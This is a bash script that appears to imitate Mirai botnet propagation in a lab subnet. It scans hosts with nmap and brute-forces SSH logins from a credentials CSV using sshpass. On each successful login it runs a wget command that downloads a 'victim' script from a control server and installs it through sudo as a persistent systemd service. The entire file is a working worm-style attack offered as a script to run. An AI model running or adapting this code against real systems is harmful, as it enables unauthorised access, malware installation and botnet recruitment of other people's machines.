#!/bin/bash

# Server informations
server_ip="192.168.237.128"
script_url="http://$server_ip:5000/affect"
script_local="/tmp/bash_victim.sh"

# Define the subnet to scan
subnet="192.168.237.0/24"

# Path to the CSV file with usernames and passwords
credentials_file="./credentials.csv"

# Define the output file for the nmap scan results
scan_results="./scan_results.txt"

# Command to download bash_victim.sh and set it to start on boot
download_and_setup_command="
wget -O $script_local $script_url &&
chmod +x $script_local &&
cat $script_local &&
echo 'kali' | sudo -S bash -c 'echo \"[Unit]
Description=Victim Side Mirai Script
After=network.target

[Service]
ExecStart=$script_local
Restart=always

[Install]
WantedBy=multi-user.target\" > /etc/systemd/system/victim.service' &&
echo 'kali' | sudo -S systemctl enable victim.service &&
echo 'kali' | sudo -S systemctl start victim.service"


# Step 1: Scan the entire subnet to discover live hosts
echo "Scanning subnet $subnet for live hosts..."
nmap -sn $subnet -oG $scan_results

# Step 2: Extract all live hosts
live_hosts=$(grep "Up" $scan_results | awk '{print $2}')
if [ -z "$live_hosts" ]; then
    echo "No live hosts found."
    exit 1
fi

echo "Live hosts found:"
echo "$live_hosts"

# Step 3: Scan each live host for common open ports
for host in $live_hosts; do
    echo "Scanning host $host for open ports..."
    open_ports_file="./open_ports_$host.txt"
    # Scan for common ports and use faster timing (-T4)
    nmap -p 22,80,443 -T4 -oG $open_ports_file $host

    # Step 4: Check if open ports were found for the host
    if grep -q "open" $open_ports_file; then
        echo "Open ports found on $host:"
        cat $open_ports_file | grep "open"

        # Step 5: Attempt connection to open ports using credentials from the CSV file
        echo "Attempting to connect to $host..."

        # Loop through each open port in the nmap results
        while IFS= read -r line; do
            # Extract the port number (example: "22/open/tcp" -> port 22)
            port=$(echo "$line" | grep -oP '\d+(?=/open/tcp)')
            if [[ -n "$port" ]]; then
                echo "Found open port: $port on $host"
                
                # Step 6: Read the CSV file line by line (username, password) and attempt to connect
                while IFS=, read -r username password; do
                    echo "Trying username: $username with password: $password on port $port"

                    # Check if the port is SSH (port 22)
                    if [ "$port" -eq 22 ]; then
                        # Attempt SSH connection using sshpass and execute the download/setup command
                        sshpass -p "$password" ssh -tt -o StrictHostKeyChecking=no -p "$port" "$username"@"$host" "$download_and_setup_command"
                        
                        # Check if the previous command was successful
                        if [ $? -eq 0 ]; then
                            echo "Success: Username: $username, Password: $password for host $host"
                            echo "bash_victim.sh downloaded and set up to start automatically on $host"
                            break  # Stop further attempts if login is successful
                        else
                            echo "Failed: Username: $username, Password: $password for host $host"
                        fi
                    else
                        echo "Skipping non-SSH port: $port"
                    fi
                done < "$credentials_file"
            fi
        done < <(grep "open/tcp" $open_ports_file)
    else
        echo "No open ports found on $host."
    fi
done
